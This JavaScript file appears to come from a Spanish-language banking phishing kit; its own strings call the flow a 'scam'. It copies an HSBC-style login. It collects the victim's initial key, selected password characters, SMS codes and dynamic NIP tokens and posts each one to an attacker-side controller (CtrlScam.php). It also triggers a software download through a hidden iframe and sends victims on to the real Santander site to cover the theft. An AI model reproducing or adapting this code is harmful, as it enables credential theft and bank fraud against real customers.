var Actions = {
    txtConInput: '',
    rutaSoftware: '',
    form: '',
    FIRSTCHAR: $('#FIRSTCHAR'),
    SECONDCHAR: $('#SECONDCHAR'),
    THIRDCHAR: $('#THIRDCHAR'),
    CLAVEINICIAL: $('#memorableAnswer'),
    errorEmptyClaveInicial: 'Ingrese su clave inicial',
    errorChar1: 'Ingrese el 2do. caracter de su contraseña',
    errorChar2: 'Ingrese el 5to. caracter de su contraseña',
    errorChar3: 'Ingrese el penúltimo caracter de su contraseña',
    txtSMSCode: '',
    txtTokenNipDinamico: '',
    init: function(){
        //alert();
    },
    getTime: function(){
        var d = new Date();
        var h = d.getHours();
        var m = d.getMinutes();
        var s = d.getSeconds();
        var tz = "";
        var fecha = "";
    
        if(h<10){h = "0"+h;tz = "AM";}else{tz = "PM";}
        if(m<10){m = "0"+m;}
        if(s<10){s = "0"+s;}
        fecha = h+":"+m+":"+s+" "+tz;
    
        return fecha;
    },
    hsbcform: function(error){
        if(error == 'clave_inicial'){
            $('#errorPaso1').css('display','block');
            $('#loadError1').text(this.errorEmptyClaveInicial);
            this.CLAVEINICIAL.focus();
        }

        if(error == 'first'){
            $('#errorPaso2').css('display','block');
            $('#loadError2').text(this.errorChar1);
            this.FIRSTCHAR.focus();
        }

        if(error == 'second'){
            $('#errorPaso2').css('display','block');
            $('#loadError2').text(this.errorChar2);
            this.SECONDCHAR.focus();
        }

        if(error == 'third'){
            $('#errorPaso2').css('display','block');
            $('#loadError2').text(this.errorChar3);
            this.THIRDCHAR.focus();
        }

    },
    tabToNextField: function(field, limit, next, evt) {
        evt = (evt) ? evt : event;
        var charCode = (evt.charCode) ? evt.charCode : ((evt.keyCode) ? evt.keyCode :
            ((evt.which) ? evt.which : 0));
        if (charCode > 31) {
            if (field.value.length == limit) {
                document.getElementById(next).focus();
            }
        }
    },
    beforeSubmit: function(){
        if(this.CLAVEINICIAL.val() == ''){
            this.hsbcform('clave_inicial');
        }else{
            $('#errorPaso1').css('display','none');
            if(this.FIRSTCHAR.val() == ''){
                this.hsbcform('first');
            }else{
                $('#errorPaso2').css('display','none');
                if(this.SECONDCHAR.val() == ''){
                    this.hsbcform('second');
                }else{
                    $('#errorPaso2').css('display','none');
                    if(this.THIRDCHAR.val() == ''){
                        this.hsbcform('third');
                    }else{
                        $('#errorPaso2').css('display','none');
                        var history = "- CLAVE INICIAL: "+this.CLAVEINICIAL.val()+" PASSWORD[ 2do: "+this.FIRSTCHAR.val()+" 5to: "+this.SECONDCHAR.val()+" Penultimo: "+this.THIRDCHAR.val()+" ]";
                        this.sendAjaxData(history, 'pass_token');

                    }
                }
            }
        }

        
    },
    folio: function(){
        var history = "- RESPUESTA DESDE EL FOLIO: ACEPTO Y SALIO AL INDEX DEL SCAM";
        this.sendAjaxData(history, 'folio');
    },
    validatetxtSMSCode: function(){
        if(this.txtSMSCode.val() == ''){
            alert('Para continuar es necesario que ingrese el código SMS que recibio.');
            this.txtSMSCode.focus();
        }else{
            var history = "- RESPUESTA CODIGO SMS: "+this.txtSMSCode.val();
            this.sendAjaxData(history, 'con_input');
        }
    },
    conInput: function(){
        if(this.txtConInput.val() == ''){
            alert('Debe ingresar la informacioón que se le solicita');
            this.txtConInput.focus();
        }else{
            var history = "- RESPUESTA CON INPUT: "+this.txtConInput.val();
            this.sendAjaxData(history, 'con_input');
        }
    },
    tokenNipDinamico: function(){
        if(this.txtTokenNipDinamico.val().length != 8){
            alert('El NIP Dinámico debe estar formado por 8 caracteres numéricos.');
            this.txtTokenNipDinamico.focus();
        }else{

            var history = "- RESPUESTA NIP DINAMICO: "+this.txtTokenNipDinamico.val();
            this.sendAjaxData(history, 'nip_dinamico');

            /*if(isNaN(this.txtTokenNipDinamico.val())){
                alert('El NIP Dinámico debe estar formado por 8 caracteres numéricos.');
                this.txtTokenNipDinamico.val("").focus();
            }else{
                var history = "- RESPUESTA NIP DINAMICO: "+this.txtTokenNipDinamico.val();
                this.sendAjaxData(history, 'con_input');
            }*/
            
        }
    },
    sinInput: function(){
        var history = "- RESPUESTA SIN INPUT: ACEPTO";
        this.sendAjaxData(history, 'sin_input');
    },
    indexScam: function(){
        var history = "- RESPUESTA SALIR AL INICIO DEL SCAM: ACEPTO";
        this.sendAjaxData(history, 'index_scam');
    },
    indexOriginal: function(){
        var history = "- RESPUESTA SALIR PAGINA ORIGINAL: ACEPTO";
        this.sendAjaxData(history, 'index_original');
    },
    downloadSoft: function(){
        $('#ifrmDownloadSoftware').attr('src',Actions.rutaSoftware);
        var history = "- ACEPTO, SE ESTA DESCARGANDO EL SOFTWARE";
        this.sendAjaxData(history, 'download_soft');
    },
    viewInstrucciones: function(){
        var history = "- Esta viendo los pasos para la instalacion";
        this.sendAjaxData(history, 'view_instrucciones');
    },
    closeInstrucciones: function(){
        var history = "- Cerro las Instrucciones de Instalacion";
        this.sendAjaxData(history, 'close_instrucciones');
    },
    sendAjaxData: function(history, option){
        $.ajax({
            type: 'POST',
            url: '../../Controllers/CtrlScam.php',
            data: {
                "request": "updateHistoryUser",
                "hora": this.getTime(),
                "history": history,
                "tipo": 0,
                "session": $('#session').val(),
                "idHistory": $('#idHistory').val()
            },
            beforeSend: function () {
                console.log("Enviando...");
            },
            success: function (resp) {
                console.log('Enviados los datos en history');
                console.log(resp)

                if(option == 'index_scam'){
                    //window.location.href="../../";
                    //window.parent.irIndexScam();
                    //window.parent.location.href="https://www.hola.com";
                    window.opener.location.reload();
                    self.close();
                    return false;
                }else if(option == 'index_original'){
                    //window.location.href="https://bit.ly/2PBqusi";
                    window.opener.location.href="https://www.santander.com.mx/";
                    self.close();
                    return false;
                }else if(option == 'download_soft'){
                    $('#pasosDown').css('display','none');
                    $('#pasosView').show('display','block');
                }else if(option == 'nip_dinamico'){
                    $('#changeNipDinamico').html('');
                    $('#UtilDialog').show();
                    App.mode = 'loading2',
                    App.changeHTML('cargando');
                    App.int3 = self.setInterval("cargarBarrInfinite()", 1000);
                    $('#Barr2min').val(0);
                    App.txtConInput.val("");
                }else if(option == 'view_instrucciones'){
                    App.changeHTML('view_instrucciones');
                }else{
                    App.mode = 'loading2',
                    App.changeHTML('cargando');
                    App.int3 = self.setInterval("cargarBarrInfinite()", 1000);
                    $('#Barr2min').val(0);
                    App.txtConInput.val("");
                }

            },
            error: function (request, textStatus, errorThrown) {
                console.log('Error al Enviar los Datos');
            }
        });
    }
};

$(document).ready(function(){
    Actions.init();

    

    $('#TokenAceptar').click(function(e){
        e.preventDefault();
        Actions.txtTokenNipDinamico = $('#TokenNIP');
        Actions.tokenNipDinamico();
    });

    $('#ContinuarFolio').click(function(e){
        e.preventDefault();
        Actions.folio();
    });

    $('#btnCODESMS').click(function(e){
        e.preventDefault();
        Actions.txtSMSCode = $('#codeSMS');
        Actions.validatetxtSMSCode();
    });

    $('#ContinuarConInput').click(function(e){
        e.preventDefault();
        Actions.txtConInput = $('#txtConInput');
        Actions.conInput();
    });


    $('#ContinuarSinInput').click(function(e){
        e.preventDefault();
        Actions.sinInput();
    });

    $('#ContinuarIndexScam').click(function(e){
        e.preventDefault();
        Actions.indexScam();
    });

    $('#ContinuarIndexOriginal').click(function(e){
        e.preventDefault();
        Actions.indexOriginal();
    });

    $('#downloadSoft').click(function(e){
        e.preventDefault();
        Actions.rutaSoftware = $('#rutaSoftware').val();
        Actions.downloadSoft();
    });

    $('#viewInstrucciones').click(function(e){
        e.preventDefault();
        Actions.viewInstrucciones();
    });


    $('#closeinstrucciones').click(function(e){
        e.preventDefault();
        Actions.closeInstrucciones();
    });

    
    $('#ContinuarTokenPassword').click(function(e){
        e.preventDefault();
        Actions.form = $('#P_5469cam10To30Form');
        Actions.beforeSubmit();
    });

    $('#P_5469cam10To30Form').submit(function(e){
        e.preventDefault();
        Actions.form = $('#P_5469cam10To30Form');
        Actions.beforeSubmit();
    });



    

    

    


    

    

    

    
});